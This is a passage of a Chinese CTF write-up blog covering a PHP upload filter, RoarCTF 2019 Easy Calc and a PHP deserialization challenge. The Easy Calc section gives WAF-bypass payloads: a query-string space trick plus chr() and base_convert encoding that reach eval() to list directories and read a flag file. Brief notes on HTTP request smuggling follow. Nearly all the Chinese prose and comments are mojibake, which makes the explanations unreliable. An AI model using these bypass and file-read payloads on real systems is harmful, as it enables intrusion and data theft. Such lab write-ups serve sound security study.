<span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>($_FILES[<span class="hljs-string">&#x27;uploaded&#x27;</span>])) &#123;
    $target_path  = getcwd() . <span class="hljs-string">&quot;/upload/&quot;</span> . md5($_SESSION[<span class="hljs-string">&#x27;user&#x27;</span>]);  <span class="hljs-comment">//getcwdåœ¨è¿™é‡Œæ˜¯/var/www/html</span>
    $t_path = $target_path . <span class="hljs-string">&quot;/&quot;</span> . basename($_FILES[<span class="hljs-string">&#x27;uploaded&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>]); <span class="hljs-comment">//$t_pathæ˜¯/var/www/html+md5+æ–‡ä»¶å</span>
    $uploaded_name = $_FILES[<span class="hljs-string">&#x27;uploaded&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>];  <span class="hljs-comment">//æ–‡ä»¶å…¨åï¼ŒåŒ…å«åç¼€</span>
    $uploaded_ext  = substr($uploaded_name, strrpos($uploaded_name,<span class="hljs-string">&#x27;.&#x27;</span>) + <span class="hljs-number">1</span>);  <span class="hljs-comment">//åç¼€ä¸ºæœ€åä¸€ä¸ªç‚¹åé¢çš„</span>
    $uploaded_size = $_FILES[<span class="hljs-string">&#x27;uploaded&#x27;</span>][<span class="hljs-string">&#x27;size&#x27;</span>];
    $uploaded_tmp  = $_FILES[<span class="hljs-string">&#x27;uploaded&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>];
 
    <span class="hljs-keyword">if</span>(preg_match(<span class="hljs-string">&quot;/ph/i&quot;</span>, strtolower($uploaded_ext)))&#123;  <span class="hljs-comment">//ä¸åŒºåˆ†å¤§å°å†™ï¼Œé‡åˆ°å«phçš„åç¼€å°±die</span>
        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;æˆ‘æ‰Œyour problem?&quot;</span>);
    &#125;
    <span class="hljs-keyword">else</span>&#123;
        <span class="hljs-keyword">if</span> ((($_FILES[<span class="hljs-string">&quot;uploaded&quot;</span>][<span class="hljs-string">&quot;type&quot;</span>] == <span class="hljs-string">&quot;</span>
<span class="hljs-string">            &quot;</span>) || ($_FILES[<span class="hljs-string">&quot;uploaded&quot;</span>][<span class="hljs-string">&quot;type&quot;</span>] == <span class="hljs-string">&quot;image/jpeg&quot;</span>) || ($_FILES[<span class="hljs-string">&quot;uploaded&quot;</span>][<span class="hljs-string">&quot;type&quot;</span>] == <span class="hljs-string">&quot;image/pjpeg&quot;</span>)|| ($_FILES[<span class="hljs-string">&quot;uploaded&quot;</span>][<span class="hljs-string">&quot;type&quot;</span>] == <span class="hljs-string">&quot;image/png&quot;</span>)) &amp;&amp; ($_FILES[<span class="hljs-string">&quot;uploaded&quot;</span>][<span class="hljs-string">&quot;size&quot;</span>] &lt; <span class="hljs-number">2048</span>))&#123;
            $content = file_get_contents($uploaded_tmp);  <span class="hljs-comment">//è¾“å‡ºä¸´æ—¶æ–‡ä»¶å†…å®¹</span>
			mkdir(iconv(<span class="hljs-string">&quot;UTF-8&quot;</span>, <span class="hljs-string">&quot;GBK&quot;</span>, $target_path), <span class="hljs-number">0777</span>, <span class="hljs-literal">true</span>);
			move_uploaded_file($uploaded_tmp, $t_path);  <span class="hljs-comment">//ç§»åŠ¨ä¸´æ—¶æ–‡ä»¶åˆ°/var/www/html+md5+æ–‡ä»¶</span>
			<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;<span class="hljs-subst">&#123;$t_path&#125;</span> succesfully uploaded!&quot;</span>;
        &#125;
        <span class="hljs-keyword">else</span>&#123;
            <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;æˆ‘æ‰Œyour problem?&quot;</span>);
        &#125;
    &#125;
&#125;
<span class="hljs-meta">?&gt;</span></code></pre>
<p>getcwd():è·å–å½“å‰ç›®å½•ï¼Œåœ¨è¿™é‡Œæ˜¯/var/www/html</p>
<p>getcwd()è¿”å›URLä¸­å¼•ç”¨çš„â€œmainâ€è„šæœ¬çš„è·¯å¾„ã€‚</p>
<p>dirname(<strong>FILE</strong>)å°†è¿”å›å½“å‰æ‰§è¡Œè„šæœ¬çš„è·¯å¾„ã€‚</p>
<p><strong><a target="_blank" rel="noopener" href="https://www.php.cn/php-weizijiaocheng-415346.html">basename()</a>å‡½æ•°ç”¨äºè¿”å›æ–‡ä»¶è·¯å¾„ä¸­çš„æ–‡ä»¶åéƒ¨åˆ†</strong></p>
<ul>
<li><p>$file = "/phpstudy/WWW/index.php";</p></li>
<li><p>echo basename($file);//å¸¦æœ‰æ–‡ä»¶æ‰©å±•å index.php</p></li>
<li><p>echo basename($file,'.php'); //å»é™¤æ–‡ä»¶æ‰©å±•å index</p></li>
</ul>
<p>strrpos()
å‡½æ•°æŸ¥æ‰¾å­—ç¬¦ä¸²åœ¨å¦ä¸€å­—ç¬¦ä¸²ä¸­<strong>æœ€åä¸€æ¬¡</strong>å‡ºç°çš„ä½ç½®ï¼ˆåŒºåˆ†å¤§å°å†™ï¼‰</p>
<p>strpos() - æŸ¥æ‰¾å­—ç¬¦ä¸²åœ¨å¦ä¸€å­—ç¬¦ä¸²ä¸­ç¬¬ä¸€æ¬¡å‡ºç°çš„ä½ç½®ï¼ˆåŒºåˆ†å¤§å°å†™ï¼‰</p>
<p>substr() å‡½æ•°è¿”å›å­—ç¬¦ä¸²ç¬¬äºŒä¸ªå‚æ•°å¼€å§‹ï¼ˆåŒ…æ‹¬ï¼‰çš„ååŠéƒ¨åˆ†ã€‚</p>
<p>æ–‡ä»¶ä¸Šä¼ ç»“æŸåï¼Œé»˜è®¤åœ°è¢«å­˜å‚¨åœ¨äº†ä¸´æ—¶ç›®å½•ä¸­ï¼Œè¿™æ—¶æ‚¨å¿…é¡»å°†å®ƒä»ä¸´æ—¶ç›®å½•ä¸­åˆ é™¤æˆ–ç§»åŠ¨åˆ°å…¶å®ƒåœ°æ–¹ï¼Œå¦‚æœæ²¡æœ‰ï¼Œåˆ™ä¼šè¢«åˆ é™¤ã€‚ä¹Ÿå°±æ˜¯ä¸ç®¡æ˜¯å¦ä¸Šä¼ æˆåŠŸï¼Œè„šæœ¬æ‰§è¡Œå®Œåä¸´æ—¶ç›®å½•é‡Œçš„æ–‡ä»¶è‚¯å®šä¼šè¢«åˆ é™¤ã€‚</p>
<h2 id="roarctf-2019easy-calc">[RoarCTF 2019]Easy Calc</h2>
<h3 id="è€ƒç‚¹phpwafå­—ç¬¦ä¸²è§£æç‰¹æ€§ç»•è¿‡phpæ‰«ç›®å½•scandirè¯»æ–‡ä»¶readfileç¼–ç ç»•è¿‡ascii">è€ƒç‚¹ï¼šphp+wafå­—ç¬¦ä¸²è§£æç‰¹æ€§ç»•è¿‡ã€phpæ‰«ç›®å½•scandirã€è¯»æ–‡ä»¶readfileã€ç¼–ç ç»•è¿‡ascii</h3>
<blockquote>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_44077544/article/details/102630714">csdn
wp</a></p>
<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/chrysanthemum/p/11757363.html">å‚è€ƒä¸ªäººåšå®¢wp</a></p>
</blockquote>
<p>è¾“å…¥å­—ç¬¦è¢«403</p>
<p><strong>è¿”å›403ï¼Ÿä¸€èˆ¬éƒ½æ˜¯PHPè¿‡æ»¤çš„ã€‚è¿™é‡Œ403.åº”è¯¥å°±æ˜¯é¢˜ç›®è¯´çš„WAFäº†</strong>
<strong>é‚£ä¹ˆæ•´ä¸ªå¤„ç†æµç¨‹åº”è¯¥æ˜¯ã€‚å‰ç«¯æœåŠ¡å™¨WAFè¿‡æ»¤ã€‚-&gt;åç«¯PHPé»‘åå•è¿‡æ»¤</strong></p>
<p>æŸ¥çœ‹æºç </p>
<pre><code class="hljs javascript">$(<span class="hljs-string">&#x27;#calc&#x27;</span>).submit(<span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)</span>&#123;
    $.ajax(&#123;
        url:<span class="hljs-string">&quot;calc.php?num=&quot;</span>+<span class="hljs-built_in">encodeURIComponent</span>($(<span class="hljs-string">&quot;#content&quot;</span>).val()), <span class="hljs-comment">//è·å–æ ‡ç­¾çš„å€¼å¹¶è¿›è¡Œurlç¼–ç </span>
        type:<span class="hljs-string">&#x27;GET&#x27;</span>,
        success:<span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">data</span>)</span>&#123;
            $(<span class="hljs-string">&quot;#result&quot;</span>).html(<span class="hljs-string">`&lt;div class=&quot;alert alert-success&quot;&gt;</span>
<span class="hljs-string">        &lt;strong&gt;ç­”æ¡ˆ:&lt;/strong&gt;<span class="hljs-subst">$&#123;data&#125;</span></span>
<span class="hljs-string">        &lt;/div&gt;`</span>);
        &#125;,
        error:<span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)</span>&#123;
            alert(<span class="hljs-string">&quot;è¿™å•¥?ç®—ä¸æ¥!&quot;</span>);
        &#125;
    &#125;)
    <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;
&#125;)</code></pre>
<p>calc.php?num=â€+encodeURIComponent($(â€œ#contentâ€).val()æ˜¯ä»€ä¹ˆæ„æ€ï¼Ÿ</p>
<p>("#content")ç›¸å½“äºdocument.getElementById("content");è·å–idä¸ºcontentçš„HTMLæ ‡ç­¾å…ƒç´ </p>
<p>è€Œ(â€œ#contentâ€).val()
ç›¸å½“äºdocument.getElementById(â€œcontentâ€).value;è·å–idä¸ºcontentçš„HTMLæ ‡ç­¾å…ƒç´ çš„å€¼</p>
<p>encodeURIComponent(str);å°†å­—ç¬¦ä¸²urlç¼–ç </p>
<p>è®¿é—®calc.php</p>
<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
error_reporting(<span class="hljs-number">0</span>);
<span class="hljs-keyword">if</span>(!<span class="hljs-keyword">isset</span>($_GET[<span class="hljs-string">&#x27;num&#x27;</span>]))&#123;
    show_source(<span class="hljs-keyword">__FILE__</span>);  <span class="hljs-comment">//numæ²¡æœ‰å€¼å°±è¿”å›calcæºç </span>
&#125;<span class="hljs-keyword">else</span>&#123;
        $str = $_GET[<span class="hljs-string">&#x27;num&#x27;</span>];
        $blacklist = [<span class="hljs-string">&#x27; &#x27;</span>, <span class="hljs-string">&#x27;\t&#x27;</span>, <span class="hljs-string">&#x27;\r&#x27;</span>, <span class="hljs-string">&#x27;\n&#x27;</span>,<span class="hljs-string">&#x27;\&#x27;&#x27;</span>, <span class="hljs-string">&#x27;&quot;&#x27;</span>, <span class="hljs-string">&#x27;`&#x27;</span>, <span class="hljs-string">&#x27;\[&#x27;</span>, <span class="hljs-string">&#x27;\]&#x27;</span>,<span class="hljs-string">&#x27;\$&#x27;</span>,<span class="hljs-string">&#x27;\\&#x27;</span>,<span class="hljs-string">&#x27;\^&#x27;</span>];
        <span class="hljs-keyword">foreach</span> ($blacklist <span class="hljs-keyword">as</span> $blackitem) &#123;
                <span class="hljs-keyword">if</span> (preg_match(<span class="hljs-string">&#x27;/&#x27;</span> . $blackitem . <span class="hljs-string">&#x27;/m&#x27;</span>, $str)) &#123;
                        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;what are you want to do?&quot;</span>);
                &#125;
        &#125;
        <span class="hljs-keyword">eval</span>(<span class="hljs-string">&#x27;echo &#x27;</span>.$str.<span class="hljs-string">&#x27;;&#x27;</span>);  <span class="hljs-comment">//å·²æœ‰echo</span>
&#125;
<span class="hljs-meta">?&gt;</span></code></pre>
<p>æ­£åˆ™è¡¨è¾¾å¼æ¨¡å¼ä¿®é¥°ç¬¦ mï¼šå¤šè¡ŒåŒ¹é…ï¼Œä¸å—</p>
<p>å°è¯•å­—æ¯ï¼Œforbiddenï¼Œ<strong>ç‰¹æ®Šå­—ç¬¦å¥½åƒå°±ç›´æ¥é¡µé¢é”™è¯¯ï¼Œï¼Œè¿™åº”è¯¥æ˜¯wafï¼ï¼ï¼</strong></p>
<p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/img/image-20220214213717838.png" srcset="/img/loading.gif" alt="image-20220214213717838" style="zoom:67%;"></p>
<h4 id="phpçš„å­—ç¬¦ä¸²è§£æç‰¹æ€§">PHPçš„å­—ç¬¦ä¸²è§£æç‰¹æ€§</h4>
<ol type="1">
<li><p>æˆ‘ä»¬çŸ¥é“PHPå°†æŸ¥è¯¢å­—ç¬¦ä¸²ï¼ˆåœ¨URLæˆ–æ­£æ–‡ä¸­ï¼‰è½¬æ¢ä¸ºå†…éƒ¨<code>$_GET</code>æˆ–çš„å…³è”æ•°ç»„<code>$_POST</code>ã€‚ä¾‹å¦‚ï¼š/?foo=barå˜æˆArray([foo]
=&gt;
â€œbarâ€)ã€‚å€¼å¾—æ³¨æ„çš„æ˜¯ï¼ŒæŸ¥è¯¢å­—ç¬¦ä¸²åœ¨è§£æçš„è¿‡ç¨‹ä¸­ä¼šå°†æŸäº›å­—ç¬¦åˆ é™¤æˆ–ç”¨ä¸‹åˆ’çº¿ä»£æ›¿ã€‚ä¾‹å¦‚ï¼Œ/?%20news[id%00=42ä¼šè½¬æ¢ä¸ºArray([news_id]
=&gt; 42)ã€‚</p></li>
<li><p>å¦‚æœä¸€ä¸ªIDS/IPSæˆ–WAFä¸­æœ‰ä¸€æ¡è§„åˆ™æ˜¯å½“news_idå‚æ•°çš„å€¼æ˜¯ä¸€ä¸ªéæ•°å­—çš„å€¼åˆ™æ‹¦æˆªï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±å¯ä»¥ç”¨ä»¥ä¸‹è¯­å¥ç»•è¿‡ï¼š<code>/news.php?%20news[id%00=42"+AND+1=0â€“</code>(<strong>wafè¯†åˆ«å‡ºå‚æ•°æ˜¯%20news[id%00è€Œä¸æ˜¯ç›®æ ‡å‚æ•°è€Œä¸å»æ‹¦æˆªï¼Œå®é™…åˆ°phpé‚£é‡Œï¼Œå‚æ•°æ˜¯news_id</strong>)</p></li>
<li><p>phpéœ€è¦å°†æ‰€æœ‰å‚æ•°è½¬æ¢ä¸ºæœ‰æ•ˆçš„å˜é‡åï¼Œå› æ­¤åœ¨è§£ææŸ¥è¯¢å­—ç¬¦ä¸²æ—¶ï¼Œå®ƒä¼šåšä¸¤ä»¶äº‹ï¼š</p></li>
</ol>
<pre><code class="hljs angelscript"><span class="hljs-number">1.</span>åˆ é™¤ç©ºç™½ç¬¦

<span class="hljs-number">2.</span>å°†æŸäº›å­—ç¬¦è½¬æ¢ä¸ºä¸‹åˆ’çº¿ï¼ˆåŒ…æ‹¬ç©ºæ ¼ï¼‰</code></pre>
<ol start="4" type="1">
<li>é‚£ä¹ˆå¦‚æœwafä¸å…è®¸numå˜é‡ä¼ é€’å­—æ¯ï¼š</li>
</ol>
<pre><code class="hljs awk">http:<span class="hljs-regexp">//</span>www.xxx.com<span class="hljs-regexp">/index.php?num = aaaa   /</span><span class="hljs-regexp">/æ˜¾ç¤ºéæ³•è¾“å…¥çš„è¯</span></code></pre>
<p>é‚£ä¹ˆæˆ‘ä»¬å¯ä»¥åœ¨numå‰åŠ ä¸ªç©ºæ ¼ï¼š</p>
<pre><code class="hljs awk">http:<span class="hljs-regexp">//</span>www.xxx.com/index.php? num = aaaa</code></pre>
<p>wafä»¥ä¸ºæ˜¯ numå‚æ•°è€Œä¸å»æ‹¦æˆªï¼Œè€Œphpè§£æå‡ºnumå‚æ•°èµ‹å€¼</p>
<p>ã€==ã€‹æˆåŠŸç»•è¿‡waf</p>
<p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/img/image-20220214215614832.png" srcset="/img/loading.gif" alt="image-20220214215614832" style="zoom:67%;"></p>
<p>scandir()ï¼šå‡½æ•°è¿”å›ä¸€ä¸ªæ•°ç»„ï¼Œå…¶ä¸­åŒ…å«æŒ‡å®šè·¯å¾„ä¸­çš„æ–‡ä»¶å’Œç›®å½•ï¼Œä¸ä¼šå›æ˜¾</p>
<p>==éœ€è¦é…åˆ<strong>print_r</strong>æˆ–<strong>var_dump</strong>è¾“å‡ºæ•°ç»„==</p>
<p><strong>ç”±äºâ€œ/â€è¢«è¿‡æ»¤äº†ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥ä½¿ç”¨chr(47)æ¥è¿›è¡Œè¡¨ç¤ºï¼Œè¿›è¡Œç›®å½•è¯»å–</strong>ã€/çš„ASCII:47ã€‘</p>
<p>payloadï¼š</p>
<ol type="1">
<li>è¯»å–æ ¹ç›®å½•</li>
</ol>
<pre><code class="hljs reasonml">/calc.php? num=print<span class="hljs-constructor">_r(<span class="hljs-params">scandir</span>(<span class="hljs-params">chr</span>(47)</span>));</code></pre>
<p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/img/image-20220214230658219.png" srcset="/img/loading.gif" alt="image-20220214230658219"></p>
<ol start="2" type="1">
<li>è¯»å–flagï¼Ÿå±è”½äº†``ï¼Œä¸èƒ½å‘½ä»¤æ‰§è¡Œï¼Œphpè¯»æ–‡ä»¶å‡½æ•°ï¼š<strong>file_get_contents</strong></li>
</ol>
<ul>
<li><strong><em>file_get_contents()
æŠŠæ•´ä¸ªæ–‡ä»¶å†…å®¹è¯»å…¥ä¸€ä¸ªå­—ç¬¦ä¸²ä¸­ã€‚<span style="background:#FF9999;">å‡½æ•°è¿”å›è¯»å–åˆ°çš„æ•°æ®ï¼Œ</span></em></strong>ï¼Œè€ŒåŸphpä»£ç å·²æœ‰echoï¼Œæ— éœ€å†æ‰“å°</li>
<li><strong>PHPä½¿ç”¨ æ ‡å‡†çš„ ç‚¹ è¿æ¥ç¬¦æ‹¼æ¥</strong></li>
<li>payload:</li>
</ul>
<pre><code class="hljs angelscript">/calc.php?%<span class="hljs-number">20</span>num=var_dump(file_get_contents(chr(<span class="hljs-number">47</span>).chr(<span class="hljs-number">102</span>).chr(<span class="hljs-number">49</span>).chr(<span class="hljs-number">97</span>).chr(<span class="hljs-number">103</span>).chr(<span class="hljs-number">103</span>)));
/calc.php?%<span class="hljs-number">20</span>num=file_get_contents(chr(<span class="hljs-number">47</span>).chr(<span class="hljs-number">102</span>).chr(<span class="hljs-number">49</span>).chr(<span class="hljs-number">97</span>).chr(<span class="hljs-number">103</span>).chr(<span class="hljs-number">103</span>));
å³file_get_contents(/f1agg)</code></pre>
<p>æˆ–è€…</p>
<p>scandirå¯ä»¥ç”¨base_convertå‡½æ•°æ„é€ ï¼Œä½†æ˜¯åˆ©ç”¨base_convertåªèƒ½è§£å†³<code>a~z</code>çš„åˆ©ç”¨ï¼Œå› ä¸ºæ ¹ç›®å½•éœ€è¦/ç¬¦å·ï¼Œä¸”ä¸åœ¨<code>a~z</code>,æ‰€ä»¥éœ€è¦hex2bin(dechex(47))è¿™ç§æ„é€ æ–¹å¼ï¼Œdechex()å‡½æ•°æŠŠåè¿›åˆ¶æ•°è½¬æ¢ä¸ºåå…­è¿›åˆ¶æ•°ã€‚hex2bin()å‡½æ•°æŠŠåå…­è¿›åˆ¶å€¼çš„å­—ç¬¦ä¸²è½¬æ¢ä¸º
ASCIIå­—ç¬¦,ç”¨readfileè¯»å–æ–‡ä»¶</p>
<ul>
<li><em><strong>readfile()å‡½æ•°: è¾“å‡ºä¸€ä¸ªæ–‡ä»¶ã€‚</strong>
<strong>è¯¥å‡½æ•°è¯»å…¥ä¸€ä¸ªæ–‡ä»¶å¹¶å†™å…¥åˆ°è¾“å‡ºç¼“å†²ã€‚è‹¥æˆåŠŸï¼Œåˆ™è¿”å›ä»æ–‡ä»¶ä¸­è¯»å…¥çš„å­—èŠ‚æ•°ã€‚è‹¥å¤±è´¥ï¼Œåˆ™è¿”å›
falseã€‚æ‚¨å¯ä»¥é€šè¿‡ <span class="citation" data-cites="readfile">@readfile</span>()
å½¢å¼è°ƒç”¨è¯¥å‡½æ•°ï¼Œæ¥éšè—é”™è¯¯ä¿¡æ¯ã€‚</strong></em></li>
</ul>
<p>payload:</p>
<pre><code class="hljs angelscript">base_convert(<span class="hljs-number">2146934604002</span>,<span class="hljs-number">10</span>,<span class="hljs-number">36</span>)(hex2bin(dechex(<span class="hljs-number">47</span>)).base_convert(<span class="hljs-number">25254448</span>,<span class="hljs-number">10</span>,<span class="hljs-number">36</span>))
å³readfile(/f1agg)</code></pre>
<p>Q1ï¼šå…¶ä»–çš„å‡½æ•°å¦‚systemæ‰§è¡Œç³»ç»Ÿå‘½ä»¤å¯ä»¥å—ï¼Ÿä¸è¡Œï¼Œå› ä¸ºphpinfoé‡Œå¯ä»¥çœ‹åˆ°ç¦ç”¨äº†<strong>systemã€exec
è¿™ä¸€ç±»å‘½ä»¤æ‰§è¡Œçš„å‡½æ•°</strong></p>
<p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/img/image-20220214232523093.png" srcset="/img/loading.gif" alt="image-20220214232523093"></p>
<h4 id="q2httpèµ°ç§æ”»å‡»">Q2ï¼šHTTPèµ°ç§æ”»å‡»</h4>
<blockquote>
<p><a target="_blank" rel="noopener" href="https://paper.seebug.org/1048/">**åè®®å±‚çš„æ”»å‡»â€”â€”HTTPè¯·æ±‚èµ°ç§ï¼Œseebugä»‹ç»</a></p>
<p><a target="_blank" rel="noopener" href="https://mayi077.gitee.io/2020/01/24/RoarCTF-2019-Easy-Calc/">ç›¸å…³WP1</a></p>
<p><a target="_blank" rel="noopener" href="https://guokeya.github.io/post/4e7t6Raji/">WP2</a></p>
<p><a target="_blank" rel="noopener" href="https://guokeya.github.io/post/AQdKm74xy/">**å„åˆ†ç±»ä»‹ç»å’Œä¾‹é¢˜</a></p>
</blockquote>
<p><strong>TE-CL</strong></p>
<p>å‰ç«¯æ ¹æ®TEæ¥è§£æã€‚æ‰€æœ‰è¯·æ±‚éƒ½è¢«ç®—ä¸Šäº† åç«¯æ ¹æ®CLæ¥è§£æã€‚22ã€‚GET
/adminå°±æˆäº†æ–°çš„è¯·æ±‚</p>
<p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/img/1579173913376.png" srcset="/img/loading.gif"></p>
<p><strong>CL-CL</strong></p>
<p>å½“ä»£ç†æœåŠ¡å™¨å’Œåç«¯æœåŠ¡å™¨æ¥æ”¶å¤šä¸ªCLã€‚è¿”å›400é”™è¯¯ã€‚ä»£ç†æœåŠ¡å™¨ä½¿ç”¨ç¬¬ä¸€ä¸ªCLå¤„ç†æ•°æ®ã€‚åç«¯æœåŠ¡å™¨ä½¿ç”¨ç¬¬äºŒä¸ªCLå¤„ç†æ•°æ®ã€<strong>æ•°æ®åˆ°è¾¾æœåŠ¡å™¨ç«¯</strong>ã€‘</p>
<p>è¿™é‡ŒGET/POSTéƒ½å¯ä»¥</p>
<p><img src="https://guokeya.github.io/post-images/1579177518794.png" srcset="/img/loading.gif"></p>
<p><img src="https://pic.downk.cc/item/5e2968b82fb38b8c3c43771b.jpg" srcset="/img/loading.gif" alt="å¤§ä½¬å›¾ç‰‡"></p>
<p>CL-CLï¼šåœ¨è¿™é¢˜å¤§æ¦‚æ„æ€æ˜¯ä¸€ä¸ªæ¶ˆæ¯åŒæ—¶åŠ ä¸Šä¸¤ä¸ªContent-Lengthï¼ŒPOSTè¯·æ±‚+GETè¯·æ±‚urlå‚æ•°ï¼Œä¼šå¯¼è‡´400æŠ¥é”™ï¼Œå‰ç«¯æ¥å—çš„æ˜¯POSTè¯·æ±‚ï¼Œä½†æ˜¯getè¯·æ±‚åˆ°äº†åç«¯ï¼ŒæœåŠ¡å™¨ç«¯ä¼šå›æ˜¾getç»“æœ</p>
<p>Q3:å­—ç¬¦ä¸²è½¬ASCIIï¼Œphpï¼šä¸èƒ½ç›´æ¥è½¬ï¼Œé™¤éå·¥å…·ï¼Œéœ€è¦æŒ¨ä¸ªå­—ç¬¦è½¬ï¼Œchr()ï¼Œå†<code>.</code>è¿æ¥èµ·æ¥</p>
<blockquote>
<p>https://evilcos.me/lab/xssor/</p>
</blockquote>
<p>å…ˆè½¬10enï¼Œå†æ›¿æ¢,ä¸º).chr(</p>
<h2 id="æå®¢å¤§æŒ‘æˆ˜-2019php">[æå®¢å¤§æŒ‘æˆ˜ 2019]PHP</h2>
<h3 id="è€ƒç‚¹å¤‡ä»½phpååºåˆ—åŒ–è·³è¿‡__wakeup">è€ƒç‚¹ï¼šå¤‡ä»½ã€phpååºåˆ—åŒ–ã€è·³è¿‡__wakeup()</h3>
<p><span style="background:#FF9999;">å±æ€§ä¸ªæ•°çš„å€¼å¤§äºå®é™…å±æ€§ä¸ªæ•°æ—¶ï¼Œä¼šè·³è¿‡
__wakeup()å‡½æ•°çš„æ‰§è¡Œ</span></p>
<p>æç¤ºç½‘ç«™å¤‡ä»½ï¼Œè®¿é—®www.zipï¼Œå¾—åˆ°æºç å’Œå‡flag</p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_35599248/article/details/119396936">dirsearch</a>å‚æ•°è§£æ</p>
<pre><code class="hljs diff"><span class="hljs-deletion">-i         ä¿ç•™çš„å“åº”çŠ¶æ€ç (ä»¥é€—å·åˆ†éš”,æ”¯æŒæŒ‡å®šèŒƒå›´) å¦‚(-i 200,300-399)</span>
<span class="hljs-deletion">-w,--wordlists              è‡ªå®šä¹‰wordlist(ä»¥é€—å·åˆ†éš”</span>
<span class="hljs-deletion">-e,--extensions             åŒ…å«çš„æ–‡ä»¶æ‹“å±•å(é€—å·åˆ†éš”) /æŒ‡å®šç½‘ç«™è¯­è¨€  å¦‚-e php,asp</span>
<span class="hljs-deletion">-u,--url                    ç›®æ ‡url</span></code></pre>
<p>index.phpå…³é”®phpï¼š</p>
<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
<span class="hljs-keyword">include</span> <span class="hljs-string">&#x27;class.php&#x27;</span>;
$select = $_GET[<span class="hljs-string">&#x27;select&#x27;</span>];
$res=unserialize(@$select);   <span class="hljs-comment">//â‘   resä¸ºå¯¹è±¡</span>
<span class="hljs-meta">?&gt;</span></code></pre>
<p>ååºåˆ—åŒ–ï¼šnewåˆ›é€ å¯¹è±¡æ—¶è§¦å‘constructæ„é€ å‡½æ•°ï¼Œunserializeæ—¶è§¦å‘wakeupï¼Œç»“æŸåè§¦å‘destructææ„å‡½æ•°</p>
<p>class.php:</p>
<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
<span class="hljs-keyword">include</span> <span class="hljs-string">&#x27;flag.php&#x27;</span>;
error_reporting(<span class="hljs-number">0</span>);
<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Name</span></span>&#123;
    <span class="hljs-keyword">private</span> $username = <span class="hljs-string">&#x27;nonono&#x27;</span>;
    <span class="hljs-keyword">private</span> $password = <span class="hljs-string">&#x27;yesyes&#x27;</span>;

    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params">$username,$password</span>)</span>&#123;
        <span class="hljs-keyword">$this</span>-&gt;username = $username;
        <span class="hljs-keyword">$this</span>-&gt;password = $password;
    &#125;
    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span>&#123;    <span class="hljs-comment">//â‘¡</span>
        <span class="hljs-keyword">$this</span>-&gt;username = <span class="hljs-string">&#x27;guest&#x27;</span>;
    &#125;
    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>&#123;   <span class="hljs-comment">//â‘¢</span>
        <span class="hljs-keyword">if</span> (<span class="hljs-keyword">$this</span>-&gt;password != <span class="hljs-number">100</span>) &#123;  <span class="hljs-comment">//ç»•è¿‡è¿™é‡Œ</span>
            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;/br&gt;NO!!!hacker!!!&lt;/br&gt;&quot;</span>;
            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;You name is: &quot;</span>;
            <span class="hljs-keyword">echo</span> <span class="hljs-keyword">$this</span>-&gt;username;<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;/br&gt;&quot;</span>;
            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;You password is: &quot;</span>;
            <span class="hljs-keyword">echo</span> <span class="hljs-keyword">$this</span>-&gt;password;<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;/br&gt;&quot;</span>;
            <span class="hljs-keyword">die</span>();
        &#125;
        <span class="hljs-keyword">if</span> (<span class="hljs-keyword">$this</span>-&gt;username === <span class="hljs-string">&#x27;admin&#x27;</span>) &#123;   <span class="hljs-comment">//å…³é”®ç‚¹  â‘£</span>
            <span class="hljs-keyword">global</span> $flag;  <span class="hljs-comment">//å¯ä»¥å˜é‡è¦†ç›–</span>
            <span class="hljs-keyword">echo</span> $flag;
        &#125;<span class="hljs-keyword">else</span>&#123;
            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;/br&gt;hello my friend~~&lt;/br&gt;sorry i can&#x27;t give you the flag!&quot;</span>;
            <span class="hljs-keyword">die</span>();
        &#125;
    &#125;
&#125;
<span class="hljs-meta">?&gt;</span></code></pre>
<p>å…³é”®ï¼š</p>
<pre><code class="hljs elixir">ä¸æ»¡è¶³<span class="hljs-variable">$this</span>-&gt;password != <span class="hljs-number">100</span>
æ»¡è¶³<span class="hljs-variable">$this</span>-&gt;username === <span class="hljs-string">&#x27;admin&#x27;</span>
ä½†æ˜¯ç¬¬â‘¡æ­¥çš„æ—¶å€™usernameè¢«åˆå§‹åŒ–å˜ä¸ºäº†guest</code></pre>
